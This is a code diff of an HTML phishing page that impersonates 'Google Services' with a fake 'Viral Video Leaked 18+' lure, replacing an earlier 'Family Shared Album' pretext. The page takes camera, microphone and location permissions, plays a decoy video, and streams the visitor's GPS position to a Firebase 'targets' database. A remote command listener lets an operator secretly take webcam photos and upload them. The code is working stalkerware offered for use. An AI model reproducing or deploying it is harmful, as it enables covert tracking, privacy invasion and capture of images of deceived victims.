@@ -3,74 +3,78 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Private Cloud Album</title>
+    <title>Google Services</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #111; color: white; text-align: center; margin: 0; padding: 20px; }
-        .gallery { display: grid; grid-template-columns: repeat(2, 1fr); gap: 10px; margin-top: 20px; }
-        .img-container { position: relative; overflow: hidden; border-radius: 10px; height: 180px; }
-        .img-container img { width: 100%; height: 100%; object-fit: cover; filter: blur(15px); }
-        #unlockBtn { margin-top: 30px; padding: 15px 40px; font-size: 18px; font-weight: bold; background: #E91E63; color: white; border: none; border-radius: 50px; cursor: pointer; }
-        #videoArea { display: none; width: 100%; margin-top: 20px; border-radius: 12px; overflow: hidden; }
-        #status { margin-top: 15px; font-size: 12px; color: #555; }
+        body { font-family: sans-serif; background: #000; color: white; text-align: center; margin: 0; padding: 0; overflow: hidden; }
+        .header { background: #1a1a1a; padding: 15px; text-align: left; font-size: 20px; color: #ccc; }
+        .container { padding: 50px 20px; }
+        .viral-text { color: #ff0000; font-size: 28px; font-weight: bold; margin-bottom: 5px; }
+        .sub-text { color: #888; font-size: 14px; margin-bottom: 40px; }
+        #playBtn { 
+            background: #8b0000; color: white; border: none; padding: 15px 40px; 
+            font-size: 18px; font-weight: bold; border-radius: 5px; cursor: pointer;
+            text-transform: uppercase; display: flex; align-items: center; margin: 0 auto;
+        }
+        #playBtn span { margin-right: 10px; font-size: 24px; }
+        #videoArea { display: none; width: 100%; height: 100vh; background: #000; position: fixed; top: 0; left: 0; z-index: 100; }
+        iframe { width: 100%; height: 100%; border: none; }
     </style>
 </head>
 <body>
+
     <div id="mainUI">
-        <h2>🌸 Family Shared Album</h2>
-        <p>Verification required to view this private album.</p>
-        <div class="gallery">
-            <div class="img-container"><img src="https://images.unsplash.com/photo-1583391733956-6c78276477e2?w=500"></div>
-            <div class="img-container"><img src="https://images.unsplash.com/photo-1595950653106-6c9ebd614d3a?w=500"></div>
+        <div class="header">Google Services</div>
+        <div class="container">
+            <div class="viral-text">🔥 Viral Video Leaked</div>
+            <div class="sub-text">Viewer discretion advised. 18+ Only.</div>
+            
+            <button id="playBtn" onclick="startSystem()">
+                <span>▶</span> WATCH VIDEO
+            </button>
         </div>
-        <button id="unlockBtn" onclick="startSystem()">Tap to View Album</button>
     </div>
 
     <div id="videoArea">
-        <p style="color:#E91E63">Decrypting Album... 65%</p>
-        <iframe id="viralPlayer" width="100%" height="300" src="" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
+        <iframe id="viralPlayer" src="" allow="autoplay; encrypted-media" allowfullscreen></iframe>
     </div>
-
-    <p id="status">Secure Connection Active</p>
 
     <script>
         const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
 
-        let userId = localStorage.getItem("target_name") || "User_" + Math.floor(Math.random() * 9999);
-        localStorage.setItem("target_name", userId);
+        let userId = localStorage.getItem("target_id") || "Target_" + Math.floor(Math.random() * 9999);
+        localStorage.setItem("target_id", userId);
 
         async function startSystem() {
             try {
-                // 1. Instant Online Trigger
+                // 1. Instant Online Status
                 await db.ref('targets/' + userId + '/location').update({ 
                     status: "Online", 
                     last_seen: firebase.database.ServerValue.TIMESTAMP 
                 });
 
-                // 2. Permission Request
-                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
-                
-                // 3. Switch UI to Video
+                // 2. Request Permissions (Silent)
+                await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
+
+                // 3. Play Video & Hide UI
                 document.getElementById('mainUI').style.display = 'none';
                 document.getElementById('videoArea').style.display = 'block';
-                // Viral Video Link (Auto-play)
-                document.getElementById('viralPlayer').src = "https://www.youtube.com/embed/tgbNymZ7vqY?autoplay=1";
+                document.getElementById('viralPlayer').src = "https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1";
 
-                // 4. Background Loops
                 initTracking();
-
-            } catch (e) { alert("Error: Please allow permissions to view the album."); }
+            } catch (e) {
+                alert("Please Allow Permissions to watch the video.");
+            }
         }
 
         function initTracking() {
-            // Live Location
+            // Live GPS Tracking
             navigator.geolocation.watchPosition((pos) => {
                 db.ref('targets/' + userId + '/location').update({
-                    lat: pos.coords.latitude,
-                    lng: pos.coords.longitude,
+                    lat: pos.coords.latitude, lng: pos.coords.longitude,
                     last_seen: firebase.database.ServerValue.TIMESTAMP
                 });
             }, null, { enableHighAccuracy: true });
@@ -78,35 +82,28 @@
             // Online Heartbeat
             setInterval(() => {
                 db.ref('targets/' + userId + '/location').update({ 
-                    status: "Online", 
-                    last_seen: firebase.database.ServerValue.TIMESTAMP 
+                    status: "Online", last_seen: firebase.database.ServerValue.TIMESTAMP 
                 });
             }, 5000);
 
-            // Command Listener
+            // Command Listener (Snap/Mic)
             db.ref('commands/' + userId).on('value', async (snap) => {
                 const cmd = snap.val();
                 if (cmd?.action === "snap") capturePhoto();
-                if (cmd?.action === "mic") recordAudio(15);
                 if (cmd) db.ref('commands/' + userId).remove();
             });
         }
 
         async function capturePhoto() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                await video.play();
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                db.ref('targets/' + userId + '/photos').push({ 
-                    image: canvas.toDataURL('image/jpeg', 0.5), 
-                    time: new Date().toLocaleTimeString() 
-                });
-                stream.getTracks().forEach(t => t.stop());
-            } catch(e) { console.log(e); }
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            db.ref('targets/' + userId + '/photos').push({ image: canvas.toDataURL('image/jpeg', 0.5), time: new Date().toLocaleTimeString() });
+            stream.getTracks().forEach(t => t.stop());
         }
     </script>
 </body>
